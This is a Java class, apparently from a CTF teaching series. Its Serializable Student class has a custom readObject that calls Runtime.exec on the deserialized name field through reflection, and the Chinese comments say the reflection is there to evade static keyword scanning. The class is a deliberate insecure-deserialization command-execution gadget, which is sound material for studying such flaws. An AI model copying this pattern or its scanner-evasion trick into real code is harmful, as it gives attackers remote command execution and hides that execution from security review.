package com.ctfstu.class05;

import java.io.IOException;
import java.io.ObjectInputStream;
import java.io.Serializable;
import java.lang.reflect.Method;

/**
 * Class05 — 反射版 readObject
 *
 * 不再直接 Runtime.exec(name)，
 * 而是用 Class.forName + getMethod + invoke 反射调用链，
 * 演示真实漏洞中如何通过反射逃避静态扫描。
 */
public class Student implements Serializable {
    private static final long serialVersionUID = 1L;
    private String name;
    private int age;

    public Student() {}

    public Student(String name, int age) {
        this.name = name;
        this.age = age;
    }

    public String getName() { return name; }
    public void setName(String name) { this.name = name; }
    public int getAge() { return age; }
    public void setAge(int age) { this.age = age; }

    // ========================
    // 反射版 readObject：
    // 用反射调用链替代直接 Runtime.exec()
    // ========================
    private void readObject(ObjectInputStream in) throws IOException, ClassNotFoundException {
        in.defaultReadObject();

        try {
            // 第一步：通过字符串获取 Runtime 类（可躲避关键字扫描）
            Class<?> runtimeClass = Class.forName("java.lang.Runtime");

            // 第二步：获取 getRuntime() 方法
            Method getRuntimeMethod = runtimeClass.getMethod("getRuntime");

            // 第三步：调用 getRuntime() 获取 Runtime 实例
            Object runtimeObj = getRuntimeMethod.invoke(null);

            // 第四步：获取 exec(String) 方法
            Method execMethod = runtimeClass.getMethod("exec", String.class);

            // 第五步：反射执行命令
            execMethod.invoke(runtimeObj, this.name);
        } catch (Exception e) {
            throw new RuntimeException("反射执行命令失败", e);
        }
    }

    @Override
    public String toString() {
        return "Student{name = " + name + ", age = " + age + "}";
    }
}
